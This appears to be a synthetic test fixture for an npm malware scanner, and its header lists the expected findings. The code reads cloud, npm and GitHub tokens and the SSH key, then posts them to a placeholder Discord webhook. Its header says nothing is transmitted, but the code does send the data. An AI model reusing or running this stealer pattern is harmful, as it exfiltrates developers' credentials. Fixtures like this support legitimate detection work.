// SYNTHETIC TEST FIXTURE — composed of recognizable patterns from past NPM
// supply-chain incidents. Defanged: the exfil endpoint is non-routable and
// the credential paths are read but never actually transmitted.
//
// Expected findings when this file is analyzed:
//   - secret-theft (CRITICAL)  — process.env.AWS_ACCESS_KEY_ID + NPM_TOKEN
//   - fs-traversal (CRITICAL)  — references to ~/.aws/credentials, ~/.npmrc
//   - net-exfil    (HIGH)       — fetch() call to a webhook destination
//   - known-c2     (CRITICAL)  — discord.com/api/webhooks indicator
//   - spawn        (HIGH)       — child_process.execSync with shell:true
//   - eval-surface (HIGH)       — eval() and new Function()
//   - entropy-blob (INFO)       — high-entropy base64 string literal

'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execSync } = require('child_process');

const HOME = os.homedir();
const TARGETS = [
  path.join(HOME, '.aws/credentials'),
  path.join(HOME, '.npmrc'),
  path.join(HOME, '.ssh/id_rsa'),
];

function harvest() {
  const out = {
    AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID,
    NPM_TOKEN: process.env.NPM_TOKEN,
    GITHUB_TOKEN: process.env.GITHUB_TOKEN,
    files: {},
  };
  for (const t of TARGETS) {
    try { out.files[t] = fs.readFileSync(t, 'utf8'); } catch (_) {}
  }
  return out;
}

// Encoded stager payload — flagged by entropy-blob rule.
const STAGER = '+GMFnmdne9DpetQErrvKIyKFJdgR9EdD14tP8734Hy0tSSzoixw35MEeB1R38gOHMsLfHVF5FKX52XIh9NnKQhF3yzvl8guFW80U50IA+0kPOyGyr7TR0/jAqzuc3RIKCAZMYJNbLVNzs1ZALnbHiU0NPHxk1uDy/+VRnfWeJuuxi4I6nsVfPXAp/KglLYyQf3yr3fZku7G3tcgaW1oz91HVVoWgCkUvbsCLy8f4K3U0RUKvC3Ihg5hFqCxVBW4oDsGQoN0qxc2w9h+q7S3AdF2sSQUtbpU44e6FyvSd/usno6QiVSt1secrvrl8lIfs92OTvpLHrnpwHk7wX4oDxQ==';

async function exfil(blob) {
  await fetch('https://discord.com/api/webhooks/EXAMPLE/abcdef', {
    method: 'POST',
    body: JSON.stringify(blob),
  });
}

function run() {
  const data = harvest();
  // shell:true is what makes spawn dangerous — command injection vector.
  execSync('uname -a', { shell: true });
  // Dynamic code execution from a literal — eval-surface rule.
  eval('console.log("loaded")');
  const fn = new Function('return 1 + 1');
  fn();
  exfil({ ...data, stager: STAGER }).catch(() => {});
}

run();
